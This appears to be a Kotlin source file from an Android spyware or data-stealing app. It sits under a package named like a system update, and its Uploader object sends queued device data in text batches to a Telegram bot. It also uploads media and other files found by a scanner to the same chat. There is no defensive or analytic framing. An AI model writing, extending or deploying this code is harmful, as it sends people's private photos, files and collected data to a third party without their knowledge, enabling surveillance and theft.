package com.sys.update

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

object Uploader {

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .readTimeout(60, TimeUnit.SECONDS)
        .build()

    fun flushQueue(ctx: Context) {
        if (!Config.hasTelegram()) return
        try {
            val lines = DataStore.drain(ctx, limit = 100)
            if (lines.isEmpty()) return
            val batch = lines.joinToString("\n").take(3500)
            sendTelegramText(batch)
        } catch (e: Exception) {
            Log.e("Uploader", "flush err: ${e.message}")
        }
    }

    fun uploadMediaFile(ctx: Context, mf: MediaScanner.MediaFile) {
        if (!Config.hasTelegram()) return
        val file = File(mf.path)
        if (!file.exists()) return
        try {
            if (mf.mime.startsWith("image/")) sendTelegramPhoto(file)
            else sendTelegramDocument(file)
        } catch (e: Exception) {
            Log.e("Uploader", "media err: ${e.message}")
        }
    }

    private fun sendTelegramText(text: String) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendMessage"
            val json = JSONObject().apply {
                put("chat_id", Config.TELEGRAM_CHAT_ID)
                put("text", text)
                put("disable_web_page_preview", true)
            }.toString()
            val req = Request.Builder()
                .url(url)
                .post(json.toRequestBody("application/json".toMediaType()))
                .build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendText err: ${e.message}")
        }
    }

    private fun sendTelegramPhoto(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendPhoto"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart(
                    "photo", file.name,
                    file.asRequestBody("image/*".toMediaType())
                )
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendPhoto err: ${e.message}")
        }
    }

    private fun sendTelegramDocument(file: File) {
        try {
            val url = "https://api.telegram.org/bot${Config.TELEGRAM_BOT_TOKEN}/sendDocument"
            val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", Config.TELEGRAM_CHAT_ID)
                .addFormDataPart("caption", file.name)
                .addFormDataPart(
                    "document", file.name,
                    file.asRequestBody("application/octet-stream".toMediaType())
                )
                .build()
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { it.close() }
        } catch (e: Exception) {
            Log.e("Uploader", "sendDoc err: ${e.message}")
        }
    }
}
